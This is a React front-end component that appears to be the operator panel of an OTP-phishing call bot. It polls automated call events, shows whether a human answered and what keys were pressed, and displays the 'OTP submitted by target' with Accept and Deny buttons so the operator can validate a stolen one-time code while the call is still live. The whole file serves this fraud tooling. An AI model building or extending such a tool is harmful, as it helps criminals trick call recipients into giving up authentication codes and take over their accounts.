import React, { useState, useEffect } from 'react';
import api from '../services/api';
import { Button } from './ui/button';
import { PhoneOff, Loader2 } from 'lucide-react';
import { toast } from 'sonner';

export default function CallLogs({ events, activeCall }) {
  const [loading, setLoading] = useState(false);
  const [currentCall, setCurrentCall] = useState(null);
  const [callEvents, setCallEvents] = useState([]);
  const [otpCode, setOtpCode] = useState(null);
  const [showAcceptDeny, setShowAcceptDeny] = useState(false);

  useEffect(() => {
    if (activeCall) {
      fetchCallDetails(activeCall.call_id);
      
      // Poll for updates every 2 seconds
      const interval = setInterval(() => {
        fetchCallDetails(activeCall.call_id);
      }, 2000);
      
      return () => clearInterval(interval);
    }
  }, [activeCall]);

  const fetchCallDetails = async (callId) => {
    try {
      const response = await api.get(`/calls/${callId}`);
      const call = response.data;
      setCurrentCall(call);
      
      // Update events - newest first
      if (call.events) {
        setCallEvents([...call.events].reverse());
      }
      
      // Check for OTP
      if (call.otp_entered && !showAcceptDeny) {
        setOtpCode(call.otp_entered);
        setShowAcceptDeny(true);
      }
    } catch (error) {
      console.error('Error fetching call details:', error);
    }
  };

  const handleHangup = async () => {
    if (!currentCall?.call_id) return;
    
    setLoading(true);
    try {
      await api.post(`/calls/${currentCall.call_id}/hangup`);
      toast.success('Call terminated successfully');
      setCurrentCall(null);
      setCallEvents([]);
    } catch (error) {
      console.error('Error hanging up call:', error);
      toast.error('Failed to terminate call');
    } finally {
      setLoading(false);
    }
  };

  const handleAccept = async () => {
    if (!currentCall?.call_id) return;
    try {
      await api.post(`/calls/${currentCall.call_id}/accept`);
      toast.success('OTP Accepted');
      setShowAcceptDeny(false);
    } catch (error) {
      toast.error('Failed to accept OTP');
    }
  };

  const handleDeny = async () => {
    if (!currentCall?.call_id) return;
    try {
      await api.post(`/calls/${currentCall.call_id}/deny`);
      toast.success('OTP Denied');
      setShowAcceptDeny(false);
    } catch (error) {
      toast.error('Failed to deny OTP');
    }
  };

  const handleClearLogs = () => {
    setCallEvents([]);
    toast.success('Logs cleared');
  };

  const getEventIcon = (eventType) => {
    const type = eventType?.toLowerCase() || '';
    if (type.includes('initiated') || type.includes('call_initiated')) return '📱';
    if (type.includes('ringing')) return '📞';
    if (type.includes('answered')) return '☎️';
    if (type.includes('human')) return '🙋';
    if (type.includes('machine') || type.includes('voicemail')) return '🤖';
    if (type.includes('message') || type.includes('played')) return '🔊';
    if (type.includes('input') || type.includes('pressed')) return '🔢';
    if (type.includes('otp') || type.includes('code')) return '🕵️';
    if (type.includes('completed')) return '🏁';
    if (type.includes('carrier')) return '📡';
    if (type.includes('service')) return '🔵';
    if (type.includes('send')) return '🚀';
    return '📋';
  };

  const getEventText = (event) => {
    if (event.message) return event.message;
    if (event.event) return event.event.replace(/_/g, ' ');
    return 'Event';
  };

  return (
    <div className="space-y-4" data-testid="call-logs">
      <div>
        <h2 className="text-2xl font-bold text-white mb-2">🤖 Bot Logs</h2>
        <p className="text-gray-400">Real-time call event monitoring</p>
      </div>

      {/* Main Bot Logs Panel */}
      <div className="glass-effect rounded-xl p-6 space-y-4">
        {/* OTP Accept/Deny Section */}
        {showAcceptDeny && otpCode && (
          <div className="p-4 bg-gradient-to-r from-orange-900/30 to-yellow-900/30 border-2 border-yellow-600/50 rounded-lg mb-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-yellow-300 font-semibold text-lg">🕵️ OTP submitted by target: {otpCode}</p>
              </div>
              <div className="flex gap-3">
                <Button 
                  onClick={handleAccept}
                  className="bg-green-600 hover:bg-green-700 text-white px-6 py-2 font-semibold"
                >
                  ✅ Accept
                </Button>
                <Button 
                  onClick={handleDeny}
                  className="bg-red-600 hover:bg-red-700 text-white px-6 py-2 font-semibold"
                >
                  ❌ Deny
                </Button>
              </div>
            </div>
          </div>
        )}

        {/* Bot Logs Event Timeline */}
        <div className="bg-[#0a0a0a] border-2 border-green-500/30 rounded-lg p-4 min-h-[400px] max-h-[500px] overflow-y-auto">
          {callEvents.length === 0 ? (
            <div className="text-center py-12">
              <p className="text-gray-500 text-lg">Waiting for call events...</p>
              <p className="text-gray-600 text-sm mt-2">Make a call to see real-time events</p>
            </div>
          ) : (
            <div className="space-y-3">
              {callEvents.map((event, index) => (
                <div 
                  key={index} 
                  className="flex items-start gap-3 p-3 bg-gray-900/30 rounded-lg border border-gray-800/50 hover:border-green-500/30 transition-colors"
                >
                  <span className="text-2xl">{getEventIcon(event.event)}</span>
                  <div className="flex-1">
                    <p className="text-gray-200 font-medium">{getEventText(event)}</p>
                    {event.data && (
                      <p className="text-gray-500 text-sm mt-1">
                        {JSON.stringify(event.data).slice(0, 100)}
                      </p>
                    )}
                    <p className="text-gray-600 text-xs mt-1">
                      @ {new Date(event.time).toLocaleTimeString()}
                    </p>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Call Info Footer */}
        {currentCall && (
          <div className="grid grid-cols-3 gap-4 pt-4 border-t border-gray-700">
            <div>
              <span className="text-gray-500 text-sm">Status:</span>
              <span className="text-green-400 ml-2 font-medium uppercase text-sm">
                {currentCall.status || 'INITIATED'}
              </span>
            </div>
            <div>
              <span className="text-gray-500 text-sm">From:</span>
              <span className="text-white ml-2 text-sm">{currentCall.from_number}</span>
            </div>
            <div>
              <span className="text-gray-500 text-sm">To:</span>
              <span className="text-white ml-2 text-sm">{currentCall.to_number}</span>
            </div>
          </div>
        )}

        {/* Action Buttons */}
        <div className="flex gap-3 pt-4">
          <Button
            onClick={handleHangup}
            disabled={loading || !currentCall}
            className="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-lg transition-colors"
            data-testid="hangup-button"
          >
            {loading ? (
              <>
                <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                Terminating...
              </>
            ) : (
              <>
                <PhoneOff className="w-4 h-4 mr-2" />
                HangUp
              </>
            )}
          </Button>
          <Button
            onClick={handleClearLogs}
            disabled={callEvents.length === 0}
            className="px-6 border-2 border-green-600 text-green-400 hover:bg-green-900/30 font-semibold"
            variant="outline"
          >
            Clear Logs
          </Button>
        </div>

        {/* Loading Message */}
        {!currentCall && (
          <div className="text-center py-4">
            <p className="text-gray-500 text-sm">Fetching data. Please do not refresh browser.</p>
          </div>
        )}
      </div>
    </div>
  );
}